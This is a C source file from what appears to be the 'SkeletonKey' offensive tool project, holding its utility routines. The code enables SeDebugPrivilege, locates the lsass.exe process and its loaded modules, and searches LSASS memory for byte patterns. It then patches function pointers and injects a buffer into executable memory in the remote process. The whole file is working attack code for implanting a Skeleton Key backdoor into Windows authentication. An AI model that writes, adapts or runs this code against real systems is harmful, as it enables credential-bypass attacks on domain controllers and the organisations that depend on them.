/*
* Author : Angelo Frasca Caccia (lem0nSec_)
* Data : 21/12/2023
* Title : Skel_utils.c
* Website : https://github.com/lem0nSec/SkeletonKey
*/


#include "SkeletonKey.h"


BOOL SetPrivilege(HANDLE hToken, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp = { 0 };
	PRIVILEGE_SET privs = { 0 };
	LUID luid = { 0 };
	BOOL status = FALSE;

	if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
	{
		return status;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else
	{
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return status;
	}

	// test privs
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	PrivilegeCheck(hToken, &privs, &status);

	return status;
}

BOOL Skel_EnableDebugPrivilege()
{
	HANDLE currentProcessToken = NULL;
	BOOL status = FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken) == TRUE)
	{
		status = SetPrivilege(currentProcessToken, TRUE);
		CloseHandle(currentProcessToken);
	}

	return status;
}

DWORD Skel_ValidateLsassPid()
{
	HANDLE hSnap = 0;
	PROCESSENTRY32W prcEntry32 = { 0 };
	DWORD processID = 0;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		prcEntry32.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32First(hSnap, &prcEntry32) == TRUE)
		{
			while (Process32Next(hSnap, &prcEntry32) == TRUE)
			{
				if (wcscmp(L"lsass.exe", prcEntry32.szExeFile) == 0)
				{
					processID = prcEntry32.th32ProcessID;
				}
			}
		}

		SecureZeroMemory(&prcEntry32, sizeof(PROCESSENTRY32W));
		CloseHandle(hSnap);

	}

	return processID;

}


BOOL Skel_GetRemoteModuleInformation(DWORD dwPid, LPWSTR mName, PSK_MODULE_INFORMATION pCryptInfo)
{
	BOOL status = FALSE;
	MODULEENTRY32W mInfo32 = { 0 };
	HANDLE hSnap = 0;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		mInfo32.dwSize = sizeof(MODULEENTRY32W);
		if (Module32First(hSnap, &mInfo32) == TRUE)
		{
			while (Module32Next(hSnap, &mInfo32) == TRUE)
			{
				if (_wcsicmp(mInfo32.szModule, mName) == 0)
				{
					status = TRUE;
					break;
				}
			}
		}

		CloseHandle(hSnap);

	}

	if (status == TRUE)
	{
		pCryptInfo->dllBase = (LPVOID)mInfo32.modBaseAddr;
		pCryptInfo->SizeOfImage = mInfo32.modBaseSize;
	}

	SecureZeroMemory(&mInfo32, sizeof(MODULEENTRY32W));

	return status;

}

LPVOID Skel_SearchRemotePatternInLoadedModule(HANDLE hProcess, PSK_MODULE_INFORMATION pCryptInfo, LPCVOID uPattern, SIZE_T szPattern)
{
	LPVOID result = 0;
	MEMORY_BASIC_INFORMATION mInfo = { 0 };
	DWORD i = 0, offset = 0;
	LPVOID LocalCopyOfRemoteDll = 0;
	LPCVOID LocalCopyOfRemotePattern = 0;
	unsigned char* p = 0;

	for (
		p = pCryptInfo->dllBase;
		VirtualQueryEx(hProcess, p, &mInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION);
		p += mInfo.RegionSize
		)
	{
		if ((DWORD64)p > (DWORD64)((DWORD_PTR)pCryptInfo->dllBase + pCryptInfo->SizeOfImage))
		{
			break;
		}

		if ((mInfo.Type == MEM_IMAGE) && (mInfo.State != MEM_FREE) && ((mInfo.Protect == PAGE_READONLY) || (mInfo.Protect == PAGE_READWRITE)) && (p != 0))
		{
			LocalCopyOfRemoteDll = (LPVOID)LocalAlloc(LPTR, mInfo.RegionSize);

			if (LocalCopyOfRemoteDll != 0)
			{
				ReadProcessMemory(hProcess, (LPCVOID)p, LocalCopyOfRemoteDll, mInfo.RegionSize, NULL);
				for (i = 0; i < mInfo.RegionSize; i++)
				{
					LocalCopyOfRemotePattern = (LPCVOID)((DWORD_PTR)LocalCopyOfRemoteDll + i);

					if (RtlEqualMemory(LocalCopyOfRemotePattern, uPattern, szPattern) == TRUE)
					{
						offset = (DWORD)((DWORD_PTR)LocalCopyOfRemotePattern - (DWORD_PTR)LocalCopyOfRemoteDll);
						result = (LPVOID)((DWORD_PTR)p + offset);
						break;
					}
				}

				SecureZeroMemory(LocalCopyOfRemoteDll, mInfo.RegionSize);
				LocalFree(LocalCopyOfRemoteDll);

				if (result != 0)
				{
					SecureZeroMemory(&mInfo, sizeof(MEMORY_BASIC_INFORMATION));
					break;
				}
			}
		}
	}

	return result;

}

LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD DataSize, PSK_FUNCTION_PTR pskFP, DWORD count, BOOL injectable) // count: sizeof(skFP) / sizeof(struct_skFP)
{
	LPVOID RemoteFunctions = 0;
	HMODULE hModule = 0;
	DWORD i = 0, j = 0;

	for (i = 0; i < count; i++)
	{
		if ((pskFP[i].Ptr == NULL) && (pskFP[i].Module != NULL) && (pskFP[i].FakePtr != NULL) && (pskFP[i].Name != NULL))
		{
			hModule = GetModuleHandle(pskFP[i].Module);
			if (hModule == NULL)
			{
				hModule = LoadLibrary(pskFP[i].Module);
			}
			if (hModule != NULL)
			{
				pskFP[i].Ptr = (PVOID)GetProcAddress(hModule, pskFP[i].Name);
			}
			else
				goto error;
		}
	}

	for (i = 0; i < count; i++)
	{
		for (j = 0; j < DataSize - sizeof(PVOID); j++)
		{
			if (*(LPVOID*)((DWORD_PTR)Buffer + j) == pskFP[i].FakePtr)
			{
				*(LPVOID*)((DWORD_PTR)Buffer + j) = pskFP[i].Ptr;
				j += sizeof(PVOID) - 1;
			}
		}
	}

	
	if ((RemoteFunctions == NULL) && (injectable == TRUE))
	{
		RemoteFunctions = VirtualAllocEx(hProcess, 0, DataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (RemoteFunctions != NULL)
		{
			if (!WriteProcessMemory(hProcess, RemoteFunctions, (LPCVOID)Buffer, DataSize, NULL))
			{
				VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
				goto error;
			}
		}
		else
			goto error;
	}
	else if ((RemoteFunctions == NULL) && (injectable == FALSE))
	{
		RemoteFunctions = (LPVOID)1;
	}

	return RemoteFunctions;

error:
	return 0;

}